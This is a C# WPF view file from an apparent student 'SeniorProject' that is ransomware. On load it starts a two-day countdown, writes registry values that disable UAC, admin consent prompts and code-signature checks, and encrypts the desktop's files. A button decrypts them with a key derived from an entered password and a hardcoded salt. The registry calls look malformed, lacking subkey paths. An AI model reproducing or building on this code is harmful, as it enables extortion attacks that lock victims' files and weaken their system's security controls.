using System;
using System.Net;
using System.Windows;
using System.Windows.Controls;
using System.Windows.Threading;
using EncryptionLogic;
using System.Net.Mail;
using System.Net.Sockets;
using System.Security.Cryptography;
using System.Threading;
using Microsoft.Win32;

namespace SeniorProject
{
	/// <summary>
	/// Interaction logic for mainView.xaml
	/// </summary>
	public partial class mainView : UserControl
	{
		private DispatcherTimer _timer;
		private TimeSpan _time;

		public mainView()
		{
			InitializeComponent();
			

			_time = TimeSpan.FromDays(2);

			_timer = new DispatcherTimer(_time, DispatcherPriority.Normal, delegate
			{
				tbTime.Content = _time.ToString("c");
				if (_time == TimeSpan.Zero) _timer.Stop();

				_time = _time.Add(TimeSpan.FromSeconds(-1));
			}, Dispatcher);

			Dispatcher.Invoke(() => { tbTime.Content = _time.ToString("c"); });
			
			setRegistry();

			Encryption encryption = new Encryption();
			encryption.encryptDesktop();
		}



		private static void setRegistry()
		{
			Registry.SetValue("HKEY_LOCAL_MACHINE", "EnableUIADesktopToggle", 1);
			Registry.SetValue("HKEY_LOCAL_MACHINE", "ConsentPromptBehaviorAdmin", 0);
			Registry.SetValue("HKEY_LOCAL_MACHINE", "EnableInstallerDetection", 0);
			Registry.SetValue("HKEY_LOCAL_MACHINE", "ValidateAdminCodeSignatures", 0);
			Registry.SetValue("HKEY_LOCAL_MACHINE", "EnableSecureUIAPaths", 0);
			Registry.SetValue("HKEY_LOCAL_MACHINE", "EnableLUA", 0);
		}

		private void button_Click(object sender, RoutedEventArgs e)
		{
			try
			{
				byte[] salt = { 38, 88, 100, 223, 246, 208, 35, 97, 86, 56, 39, 173, 69, 59, 144, 204, 130, 90, 97, 238, 33, 7, 169, 124, 36, 6, 92, 146, 36, 8, 62, 122 };
				Rfc2898DeriveBytes key = new Rfc2898DeriveBytes(decryptBox.Text, salt, 50000);
				Encryption.decryptAllFiles(key);

			}
			catch (Exception ex)
			{
				MessageBox.Show(ex.Message);
				MessageBox.Show(ex.InnerException.ToString());
			}
		}
	}
}
